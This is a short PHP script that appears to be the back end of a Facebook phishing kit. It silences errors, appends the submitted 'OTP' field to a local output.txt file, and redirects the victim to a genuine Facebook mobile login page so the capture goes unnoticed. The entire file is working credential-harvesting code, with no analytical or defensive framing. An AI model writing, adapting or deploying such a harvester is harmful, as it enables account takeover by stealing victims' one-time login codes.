<?php
error_reporting(0);
ini_set('display_errors', 0);
file_put_contents("output.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2FTAGamingshop%2F%3Frefsrc%3Dhttps%253A%252F%252Fmbasic.facebook.com%252F106642184449673%26_rdr&email=&li=EU1aXzRQg6xl5fUQ5LrnI1NW&e=1348092&shbl=1&ref=104&refsrc=https%3A%2F%2Fmbasic.facebook.com%2F106642184449673&_rdr');
exit();
